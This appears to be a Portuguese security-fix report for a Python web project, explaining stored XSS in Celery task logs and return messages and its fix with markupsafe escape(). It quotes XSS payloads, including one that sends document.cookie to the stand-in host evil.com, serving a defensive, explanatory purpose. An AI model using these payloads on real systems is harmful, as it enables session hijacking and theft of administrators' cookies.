# Correção CWE-20,79,80: Cross-Site Scripting (XSS) em tasks.py

## Vulnerabilidade Identificada
**Ficheiro:** `app/tasks.py`  
**Linhas:** 37, 38  
**Severidade:** MÉDIA  
**CWE:** CWE-20 (Improper Input Validation), CWE-79 (XSS), CWE-80 (XSS)

## Descrição da Vulnerabilidade

### Dados de DB Não Sanitizados em Logs e Retorno
- **Problema:** `venda.fatura_ref` e `venda.comprador.email` usados sem sanitização
- **Risco:** XSS em logs e mensagens de retorno de tasks
- **Impacto:** Execução de JavaScript malicioso quando logs são visualizados

### Locais Vulneráveis

#### 1. Log de Info (linha 37)
```python
app.logger.info(f"Gerando documentos para Ref: {venda.fatura_ref}")  # ❌ XSS
```

#### 2. Retorno da Task (linha 38)
```python
return f"Documentos enviados para {venda.comprador.email}"  # ❌ XSS
```

### Cenário de Exploração

#### Ataque via fatura_ref
1. Atacante cria transação com `fatura_ref = "AK-<script>alert('XSS')</script>"`
2. Task `enviar_fatura_email()` é executada
3. Log criado: `"Gerando documentos para Ref: AK-<script>alert('XSS')</script>"`
4. Admin visualiza logs em painel web
5. JavaScript é executado no browser do admin

#### Ataque via email
1. Atacante cria conta com email malicioso: `"user@example.com<img src=x onerror=alert(1)>"`
2. Task retorna: `"Documentos enviados para user@example.com<img src=x onerror=alert(1)>"`
3. Mensagem exibida em interface de monitorização
4. JavaScript executado

## Correção Implementada

### Sanitização com escape()

#### 1. Import do escape
```python
from markupsafe import escape
```

#### 2. Log de Info
**Antes:**
```python
app.logger.info(f"Gerando documentos para Ref: {venda.fatura_ref}")
```

**Depois:**
```python
app.logger.info(f"Gerando documentos para Ref: {escape(venda.fatura_ref)}")
```

#### 3. Retorno da Task
**Antes:**
```python
return f"Documentos enviados para {venda.comprador.email}"
```

**Depois:**
```python
return f"Documentos enviados para {escape(venda.comprador.email)}"
```

## Camadas de Proteção

1. ✅ **escape(venda.fatura_ref)**: Sanitiza referência da fatura em logs
2. ✅ **escape(venda.comprador.email)**: Sanitiza email em retorno
3. ✅ **Consistência**: Mesmo padrão usado em todo o projeto
4. ✅ **Defense in depth**: Proteção em múltiplas camadas

## Impacto da Correção

### Segurança
- ✅ Previne XSS em logs de tasks
- ✅ Protege admins que monitorizam tasks
- ✅ Previne XSS em mensagens de retorno
- ✅ Sanitização consistente com outras tasks

### Integridade de Logs
- ✅ Logs seguros para visualização em HTML
- ✅ Dados preservados mas escapados
- ✅ Auditoria mantém informação útil sem risco

### Compliance
- ✅ OWASP Top 10 - A03:2021 (Injection)
- ✅ CWE-79 (Cross-site Scripting)
- ✅ Consistência com outras correções no projeto

## Contexto de Risco

### Por que Logs de Tasks Precisam de Sanitização?
1. **Painel de Monitorização**: Logs exibidos em interface web (Celery Flower, etc.)
2. **Dashboards**: Ferramentas de monitorização podem renderizar HTML
3. **Relatórios**: Logs exportados para HTML/PDF
4. **Stored XSS**: Payload armazenado em logs, executado depois

### Por que Sanitizar Email?
1. **Validação Fraca**: Email pode conter caracteres especiais
2. **Retorno de Task**: Mensagem pode ser exibida em UI
3. **Defense in Depth**: Mesmo que email seja validado, sanitização adiciona camada extra

## Exemplo Real de Ataque

### Cenário 1: XSS via fatura_ref
```python
# Atacante manipula fatura_ref:
fatura_ref = "AK-<img src=x onerror='fetch(\"https://evil.com?log=\"+document.cookie)'>"

# Log criado:
"Gerando documentos para Ref: AK-<img src=x onerror='fetch(\"https://evil.com?log=\"+document.cookie)'>"

# Admin visualiza logs → Cookie roubado ❌

# Com escape:
"Gerando documentos para Ref: AK-&lt;img src=x onerror=...&gt;"

# Admin visualiza logs → Texto seguro ✅
```

### Cenário 2: XSS via email
```python
# Atacante cria conta com email:
email = "user@example.com<script>alert(document.domain)</script>"

# Retorno:
"Documentos enviados para user@example.com<script>alert(document.domain)</script>"

# Exibido em UI → JavaScript executado ❌

# Com escape:
"Documentos enviados para user@example.com&lt;script&gt;alert(document.domain)&lt;/script&gt;"

# Exibido em UI → Texto seguro ✅
```

## Testes Recomendados

1. **XSS em fatura_ref:** `AK-<script>alert(1)</script>` → Escapado ✅
2. **XSS em email:** `user@test.com<img src=x onerror=alert(1)>` → Escapado ✅
3. **Visualização de Logs:** Verificar que logs não executam JavaScript ✅
4. **Retorno de Task:** Verificar que mensagem é exibida como texto ✅
5. **Email Normal:** `user@example.com` → Funciona normalmente ✅

## Comparação com Outras Tasks

### Consistência no Projeto
- ✅ **faturas.py**: Usa `escape()` em logs e notificações
- ✅ **relatorios.py**: Usa `escape()` em logs e mensagens
- ✅ **notificacoes_disputas.py**: Usa `escape()` em todas as notificações
- ✅ **tasks.py**: Agora usa `escape()` em logs e retornos

## Dados Sanitizados (Total: 2 ocorrências)

1. ✅ `escape(venda.fatura_ref)` - Linha 37 (log)
2. ✅ `escape(venda.comprador.email)` - Linha 38 (retorno)

## Nota sobre Validação de Email

### Email já deve ser validado na entrada
```python
# No modelo Usuario ou formulário de registro:
from wtforms.validators import Email

email = StringField('Email', validators=[Email()])
```

### Mas sanitização adiciona camada extra
- **Validação**: Previne emails inválidos
- **Sanitização**: Previne XSS mesmo se validação falhar
- **Defense in Depth**: Múltiplas camadas de proteção

## Status
✅ **CORRIGIDO** - Dados de DB sanitizados com escape() em logs e retorno para prevenir XSS
